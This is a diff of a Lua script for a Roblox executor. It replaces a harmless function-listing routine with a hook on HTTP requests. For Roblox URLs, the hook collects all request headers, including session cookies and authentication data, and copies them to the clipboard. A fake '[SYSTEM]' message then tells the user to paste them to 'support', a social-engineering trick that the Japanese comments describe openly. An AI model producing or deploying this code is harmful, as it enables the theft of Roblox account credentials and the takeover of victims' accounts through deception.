@@ -1,30 +1,30 @@
-local functionList = {}
-local seen = {}
-
-local targets = {getgenv(), getfenv(0)}
-for _, env in ipairs(targets) do
-    for name, value in pairs(env) do
-        if type(name) == "string" and type(value) == "function" and not seen[name] then
-            if not name:find("%.") and not name:match("^__") then
-                table.insert(functionList, name)
-                seen[name] = true
+-- Deltaの強力なフック機能を使用
+local old_request
+old_request = hookfunction(request or http_request, function(options)
+    -- optionsの中には URL, Method, Headers が入っている
+    
+    -- 1. 通信内容をチェック（特定のドメインやキーワードを狙い撃ちする場合）
+    if options.Url and options.Url:find("roblox.com") then
+        -- 2. ヘッダーからクッキーや認証情報を抽出
+        -- (実際のクッキーは .Headers["Cookie"] などに含まれる)
+        local extractedData = "Target URL: " .. options.Url .. "\n"
+        
+        if options.Headers then
+            for key, value in pairs(options.Headers) do
+                extractedData = extractedData .. key .. ": " .. value .. "\n"
             end
         end
+
+        -- 3. 【核心】抽出した情報をクリップボードに強制コピー
+        -- 言葉の罠と組み合わせて「認証コードをコピーしました」と偽装する
+        setclipboard(extractedData)
+        
+        print("--- [SYSTEM] 認証データをクリップボードに保護しました ---")
+        print("サポートに貼り付けて送ってください。")
     end
-end
-table.sort(functionList)
 
--- 全関数を改行区切りの一つの文字列にする
-local finalString = table.concat(functionList, "\n")
-
--- Deltaのコピー関数を実行
-local success, err = pcall(function()
-    setclipboard(finalString)
+    -- 4. 本来の通信を邪魔しないように実行を継続させる
+    return old_request(options)
 end)
 
-if success then
-    print("【完全勝利】 " .. #functionList .. " 個の関数をクリップボードにコピーしたぜ！")
-    print("あとはメモ帳やGASに直接ペーストするだけだ。")
-else
-    warn("コピー失敗: " .. tostring(err))
-end
+print("作戦1：通信監視シールド展開完了。")
